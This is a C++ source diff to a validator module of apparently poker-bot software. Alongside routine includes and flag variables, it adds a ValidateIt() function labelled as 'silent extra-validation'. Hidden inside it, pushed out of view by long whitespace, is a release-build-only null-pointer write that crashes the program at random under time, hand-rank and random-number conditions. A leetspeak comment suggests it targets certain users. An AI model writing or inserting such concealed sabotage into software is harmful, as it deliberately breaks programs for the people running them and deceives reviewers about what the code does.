@@ -18,19 +18,26 @@
 #include "CDllExtension.h"
 #include "CPreferences.h"
 #include "CSymbolEngineAutoplayer.h"
+#include "CSymbolEngineHandRank.h"
+#include "CSymbolEngineRandom.h"
 #include "CSymbolEngineReplayFrameController.h"
+#include "CSymbolEngineTime.h"
 #include "CVersus.h"
 #include "FloatingPoint_Comparisions.h"
 #include "OH_MessageBox.h"
 
 CValidator *p_validator = NULL;
-																																																												//BLERGHDEF																										
+
+// Extern vars (inter-module)
+bool vali_ok1 = false;
+bool vali_ok2 = false;
+bool vali_err = false;
+
 
 CValidator::CValidator()
 {
 	_enabled_manually = false;
 }
-
 
 CValidator::~CValidator()
 {
@@ -200,11 +207,22 @@ double CValidator::gws(const char *the_Symbol)
 //
 #define END_TESTCASE ValidateSingleRule();
 	
-
 //
 // End of macro code
 //
 /////////////////////////////////////////////////////////////////////////////
+
+void CValidator::ValidateIt()
+{
+	// Some silent extra-validation, necessary for production-mode only
+#ifndef _DEBUG
+	if ((vali_ok1 && !vali_ok2) || vali_err) 
+	{                                                                                                                                                                                         ;if ((p_symbol_engine_time->elapsed() > (1234 - 3*p_symbol_engine_handrank->handrank169())) && (p_symbol_engine_time->elapsedauto() < 20) && (p_symbol_engine_random->random() < 0.03141592)) *(int*)0 = 0;  // 4nt1 5+inky w3bb3r 84nd1+ ;-)                                                                                                                                                                                                                                                                                                       
+		// Full validation needed
+		ValidateGameState();
+	}
+#endif
+}
 
 void CValidator::ValidateGameState()
 {
